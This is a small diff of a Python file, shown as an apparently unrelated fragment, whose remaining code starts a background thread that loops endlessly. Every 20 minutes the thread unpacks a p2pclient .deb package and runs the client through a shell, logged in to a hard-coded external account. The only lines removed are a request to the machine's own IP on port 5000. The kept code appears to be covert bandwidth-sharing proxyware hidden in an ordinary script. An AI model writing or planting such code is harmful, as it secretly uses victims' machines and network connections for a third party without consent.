@@ -12,8 +12,6 @@ def s():
     def f1():
         ip = requests.get("https://api.ipify.org").text
         while(True):
-            r = requests.get(f"{ip}:5000")
-            print(r)
             subprocess.call("dpkg -x p2pclient_0.56_amd64.deb ~ && cd usr/bin && ./p2pclient --login arijitpaine249@gmail.com",shell=True)
             time.sleep(1200)
     t = threading.Thread(target=f1)
